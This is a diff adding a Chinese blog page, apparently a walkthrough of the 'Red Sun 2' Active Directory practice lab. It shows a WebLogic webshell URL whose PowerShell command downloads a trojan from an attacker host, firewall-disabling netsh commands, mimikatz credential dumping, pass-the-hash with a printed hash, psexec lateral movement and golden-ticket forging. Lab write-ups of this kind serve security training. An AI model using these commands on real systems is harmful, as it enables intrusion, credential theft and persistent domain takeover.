@@ -1,0 +1,528 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/default.png">
+  <link rel="icon" href="/img/default.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="KKfine&#39;s blog">
+  <meta name="keywords" content="">
+  
+  <title>红日靶场2 - KKfine&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/atelier-estuary-light.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>KKfine's blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/9.jpg') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="红日靶场2">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2023-02-23 12:46" pubdate>
+        2023年2月23日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.5k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      16
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">红日靶场2</h1>
+            
+            <div class="markdown-body">
+              <h1 id="红日靶场2"><a href="#红日靶场2" class="headerlink" title="红日靶场2"></a>红日靶场2</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>web：</p>
+<figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm">外网<span class="hljs-built_in">ip</span> - <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">80</span><br>内网<span class="hljs-built_in">ip</span> - <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">80</span><br></code></pre></div></td></tr></table></figure>
+<p>PC：</p>
+<figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm">外网<span class="hljs-built_in">ip</span> - <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">10</span>.<span class="hljs-number">201</span><br>内网<span class="hljs-built_in">ip</span> - <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">201</span><br><span class="hljs-symbol">OS</span>：Windows <span class="hljs-number">7</span><br></code></pre></div></td></tr></table></figure>
+<p>DC：</p>
+<figure class="highlight armasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs armasm">内网<span class="hljs-built_in">ip</span> - <span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span>.<span class="hljs-number">10</span><br><span class="hljs-symbol">web</span>、<span class="hljs-built_in">PC</span>、DC都处于同一域环境内，需要手动开启weblogic服务<br><span class="hljs-symbol">OS</span>：Windows <span class="hljs-number">2012</span><br>应用：AD域<br></code></pre></div></td></tr></table></figure>
+
+<p>考察的相关技能</p>
+<figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">Bypass UAC<br>Windows系统NTLM获取（理论知识：Windows认证）<br>Access Token利用（MSSQL利用）<br>WMI利用<br>网页代理，二层代理，特殊协议代理（DNS，ICMP）<br>域内信息收集<br>域漏洞利用：SMB relay，EWS relay，PTT(PTC)，MS14-<span class="hljs-number">068</span>，GPP，SPN利用<br>域凭证收集<br>后门技术（黄金票据<span class="hljs-regexp">/白银票据/</span>Sid History/MOF）<br><br></code></pre></div></td></tr></table></figure>
+
+
+<h2 id="外网打点"><a href="#外网打点" class="headerlink" title="外网打点"></a>外网打点</h2><p>这里便于使用物理机上工具给web多加了一个网卡(192.168.52.0/24)以便物理机能够访问。</p>
+<p>先收集一下信息,靶机开了防火墙是禁止ping的。可以看到一些容易攻击的端口都开放了。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/12b1bee1656a93a028d8f717176e3ef3.png" srcset="/img/loading.gif" lazyload></p>
+<p>扫描一下详细信息。445端口开启其实就是说明存在smb服务，可能会存在ms系列的漏洞攻击比如MS17-010等等，135端口开了也就是Samba服务就可能存在爆破/未授权访问/远程命令执行漏洞，1433端口则说明该服务器部署mssql,可能存在mssql弱口令从而通过mssql命令执行及提权等操作.而7001端口就是weblogic服务也是很大可能存在漏洞攻击的地方。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/5b549fee56a4c1c4a0631f036281e817.png" srcset="/img/loading.gif" lazyload><br><img src="https://img-blog.csdnimg.cn/img_convert/ac4e67c7dd116ce4c251ec2c5e2a598c.png" srcset="/img/loading.gif" lazyload><br>看到7001端口大概率是weblogic，爆破下目录。在7001端口下发现weblogic服务。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/9aa2d12ddfbaa126563ea7b3f56eb489.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/bc21f0ae4cb0df18d593d9e8a0b039f5.png" srcset="/img/loading.gif" lazyload></p>
+<p>weblogincscan扫一下，发现存在两个反序列化漏洞cve</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/30a82a5bff2de3d18573f5c53013b10c.png" srcset="/img/loading.gif" lazyload></p>
+<p>渗透的话直接找个exp打，但是直接用冰蝎连接不成功。此处可以直接利用命令行工具远程下载木马，windows下载命令参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7937#toc-2">windows命令行工具</a>，然后冰蝎连接。</p>
+<figure class="highlight properties"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs properties"><span class="hljs-attr">http</span>:<span class="hljs-string">//192.168.52.138:7001/bea_wls_internal/demo.jsp?pwd=admin&amp;cmd=powershell (new-object System.Net.WebClient).DownloadFile(&#x27;http://192.168.52.1:7777/jsp.txt&#x27;,&#x27;C:\\Oracle\\Middleware\\user_projects\\domains\\base_domain\\servers\\AdminServer\\tmp\\_WL_internal\\bea_wls_internal\\9j4dqk\\war\\evil.jsp&#x27;)</span><br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/b6175072fa079767aa042beb788c5ccd.png" srcset="/img/loading.gif" lazyload></p>
+<p>后面发现一个好用的工具,也可以直接上传webshell。<br><img src="https://img-blog.csdnimg.cn/img_convert/263c6512591d1af76985b896db46a802.png" srcset="/img/loading.gif" lazyload></p>
+<p>冰蝎连接之后也是为了更方便的cs上线或者攻击内网，其实也可以远程下载exe文件然后执行。<br><img src="https://img-blog.csdnimg.cn/img_convert/bef23088238cdda27b0308958f7a3ebb.png" srcset="/img/loading.gif" lazyload></p>
+<p>收集一下信息，机子上有两个用户，administrator不是域用户，猜测可能de1ay为域用户，发现存在3个网段，其中192.168.52.1是主机模式网段，判断内网还存在192.168.111.1/24和10.10.10.1/24两个网段<br><img src="https://img-blog.csdnimg.cn/img_convert/963eee1e324df8bfd3707b1f30c82ccf.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看一下ip，发现两个ip，10开头的大概率就是内网。<br><img src="https://img-blog.csdnimg.cn/img_convert/49e517e24e22af1bd85dc45d9222d2f7.png" srcset="/img/loading.gif" lazyload></p>
+<p>存在de1ay域环境。<br><img src="https://img-blog.csdnimg.cn/img_convert/8638ba0793a8fbe5a09832540daa35fd.png" srcset="/img/loading.gif" lazyload><br><img src="https://img-blog.csdnimg.cn/img_convert/2e101ee1e57424f525061cdde75b039c.png" srcset="/img/loading.gif" lazyload></p>
+<p>关闭防火墙,关闭之后是可以ping了的，不过也是为了防止cs上不了线。</p>
+<figure class="highlight pf"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pf">netsh advfilewall show allprofiles <span class="hljs-keyword">state</span><br>netsh advfilewall <span class="hljs-built_in">set</span> allprofiles <span class="hljs-keyword">state</span> off<br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c8da76cb3ce7a23a887fa825dc05120b.png" srcset="/img/loading.gif" lazyload></p>
+<h2 id="内网提权信息收集"><a href="#内网提权信息收集" class="headerlink" title="内网提权信息收集"></a>内网提权信息收集</h2><p>用冰蝎上传一个cs生成的exe，实际环境中肯定需要免杀木马的，直接运行cs上线。<br>直接还是常规做法先hashdump下密码还有mimikatz抓下明文密码，因为是windwos 2008这里直接就有明文密码。大概率是域控登录过这台机子所以也留下了凭证。<br><img src="https://img-blog.csdnimg.cn/img_convert/9433384269850fbbac58592a446f5680.png" srcset="/img/loading.gif" lazyload></p>
+<p>可以尝试先哈希传递攻击，这个靶场我没改密码所以密码恰巧都是一样所以hash传递攻击很方便。但我们拿到的这个机子的adminitrator不在域中，尝试用de1ay用户的ntlm hash来传递。</p>
+<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">pth</span> de<span class="hljs-number">1</span>ay\Administrarot <span class="hljs-number">161</span>cff<span class="hljs-number">084477</span>fe<span class="hljs-number">596</span>a<span class="hljs-number">5</span>db<span class="hljs-number">81874498</span>a<span class="hljs-number">24</span><br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/c10e152cb237e23a0a6c45c2382fdc99.png" srcset="/img/loading.gif" lazyload></p>
+<p>利用管道访问dc域控<br><img src="https://img-blog.csdnimg.cn/img_convert/f8872cee858725ef140578aee234008c.png" srcset="/img/loading.gif" lazyload></p>
+<p>不过正常来讲应该先提权，这里可以直接用cs的svc-exe提权，其实本质上还是psexec提权.</p>
+<figure class="highlight clean"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs clean">使用前提：<br>开启admin共享(默认开启)（关闭的话会提示找不到网络名）<br>对方未开启防火墙<br>若是工作组环境必须要administrator用户(其他会提示拒绝访问)<br>若是域环境，普通域用户/域管理员都可。普通域-&gt;普通域主机，域控-&gt;管理员账户<br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/fe1c8182955dff05723c6fdf18ef61c1.png" srcset="/img/loading.gif" lazyload></p>
+<p>然后需要收集域信息的话就需要一个域用户。这里有几种打法</p>
+<figure class="highlight makefile"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs makefile">使用凭证有三种方法<br><span class="hljs-section">第一种:使用make_token去调用</span><br><span class="hljs-section">第二种:使用pth命令生成一个新的进程注入进去，然后steal_token使用</span><br><span class="hljs-section">第三种:使用spawn as</span><br></code></pre></div></td></tr></table></figure>
+<p>这里用的第二种方法，spawnas不知道为啥不行。</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/0ba3f62927870a756422d5b2488ff029.png" srcset="/img/loading.gif" lazyload></p>
+<p>查看域用户，除了mssql还有de1ay用户。<br><img src="https://img-blog.csdnimg.cn/img_convert/f7117e19dacbd57df9287d067d152207.png" srcset="/img/loading.gif" lazyload></p>
+<p>域控就是dc，<br><img src="https://img-blog.csdnimg.cn/img_convert/e721254f0ff12f02651a00205c228bff.png" srcset="/img/loading.gif" lazyload></p>
+<p>域机器有两台，PC$和WEB$<br><img src="https://img-blog.csdnimg.cn/img_convert/36011bf2e7478f74c7135716192b9f89.png" srcset="/img/loading.gif" lazyload></p>
+<p>所以现在域内其实就三台机子</p>
+<figure class="highlight gams"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gams">域控dc <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.10</span><br>域成员： administrator mssql de1ay krbtgt<br>域管理员：administrator<br>域内服务器：PC<span class="hljs-symbol">$</span>,WEB<span class="hljs-symbol">$</span><br></code></pre></div></td></tr></table></figure>
+
+<p>开始收集域内其它主机信息</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/cf45cd5af136eae04b1e4a093d0171dc.png" srcset="/img/loading.gif" lazyload></p>
+<figure class="highlight accesslog"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs accesslog"><span class="hljs-number">10.10.10.10</span> 域控 DC<br><span class="hljs-number">10.10.10.80</span> WEB 服务器<br><span class="hljs-number">10.10.10.201</span> PC 主机<br><br></code></pre></div></td></tr></table></figure>
+<h2 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h2><p>考虑直接psexec横向移动，监听器必须选择smb</p>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/30a051308994fc547f5074cfa8e13e6f.png" srcset="/img/loading.gif" lazyload></p>
+<p>成功上线dc域控，pc没有成功可能开启防火墙了。<br><img src="https://img-blog.csdnimg.cn/img_convert/78b6e2cf9e78d1768ce1132022887a05.png" srcset="/img/loading.gif" lazyload><br><img src="https://img-blog.csdnimg.cn/img_convert/7019f91c9b29b88b2d5590accb22d991.png" srcset="/img/loading.gif" lazyload></p>
+<p>后来将pc防火墙关闭就能全部上线了。<br><img src="https://img-blog.csdnimg.cn/img_convert/c0d5f798c6477ca637e6cad1c50bed0e.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="制作黄金票据"><a href="#制作黄金票据" class="headerlink" title="制作黄金票据"></a>制作黄金票据</h3><p>既然拿到域控了，看看能否dump krbtgt的hash来制作黄金票据，这样就能伪造任意用户了。能制作黄金票据意味着你大概率已经掌握了域控权限，因为黄金票据最重要的就是需要获取到krbtgt的ntlm hash，所以可以用来权限维持。当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。<br>伪造黄金凭据需要具备下面条件：</p>
+<figure class="highlight isbl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs isbl"><span class="hljs-variable">krbtgt</span>用户的<span class="hljs-function"><span class="hljs-title">hash</span>(就意味着你已经有域控制器权限了)</span><br>域名称<br>域的<span class="hljs-variable">SID</span>值<br>要伪造的用户名<br></code></pre></div></td></tr></table></figure>
+<p>获取krbtgt hash<br><img src="https://img-blog.csdnimg.cn/img_convert/394a89b8942b070fee2503abb9e286d6.png" srcset="/img/loading.gif" lazyload><br>获取域管sid</p>
+<figure class="highlight applescript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs applescript">shell wmic useraccount <span class="hljs-keyword">where</span> <span class="hljs-built_in">name</span>=<span class="hljs-string">&quot;administrator&quot;</span> <span class="hljs-keyword">get</span> sid<br></code></pre></div></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/img_convert/013ae8089a4b23a1027c003ca692f1f0.png" srcset="/img/loading.gif" lazyload></p>
+<p>cs制作黄金票决<br><img src="https://img-blog.csdnimg.cn/img_convert/628dae8ebf91b5695cbd84816ce87b3c.png" srcset="/img/loading.gif" lazyload></p>
+<p>即可访问dc主机<br><img src="https://img-blog.csdnimg.cn/img_convert/471c2457711d3bd292f7432b553087df.png" srcset="/img/loading.gif" lazyload></p>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/02/18/2023-2-18-Kerberos%E5%8D%8F%E8%AE%AE%E7%9B%B8%E5%85%B3%E6%94%BB%E5%87%BB%E4%B8%80%E4%B9%8B%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0/">
+                        <span class="hidden-mobile">Kerberos协议相关攻击一之委派攻击学习</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
